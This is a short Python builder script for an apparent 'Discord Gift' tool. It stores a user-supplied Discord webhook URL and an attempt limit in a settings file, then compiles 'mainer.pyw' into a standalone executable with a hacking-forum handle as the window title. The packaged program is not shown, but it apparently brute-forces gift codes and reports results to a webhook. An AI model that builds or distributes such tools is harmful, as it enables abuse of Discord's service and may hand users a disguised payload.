import os


def main():
	print("""
 ___    _                            _      ___   _    __   _   
|   \  (_)  ___  __   ___   _ _   __| |    / __| (_)  / _| | |_ 
| |) | | | (_-< / _| / _ \ | '_| / _` |   | (_ | | | |  _| |  _|
|___/  |_| /__/ \__| \___/ |_|   \__,_|    \___| |_| |_|    \__|
                                                                 

		""")

	url = input('DISCORD URL\n>')
	limit = input('send report after attempts \n>')

	file = open('modules/settings.py', 'w')
	file.write(f'''
URLWEBHOOK = "{url}"
limit = {limit}
''')

	os.system('title https://lolz.guru/members/3614790/ Genius#0706')
	os.system('pyinstaller --onefile mainer.pyw --add-data modules;modules')

if __name__ == '__main__':
	main()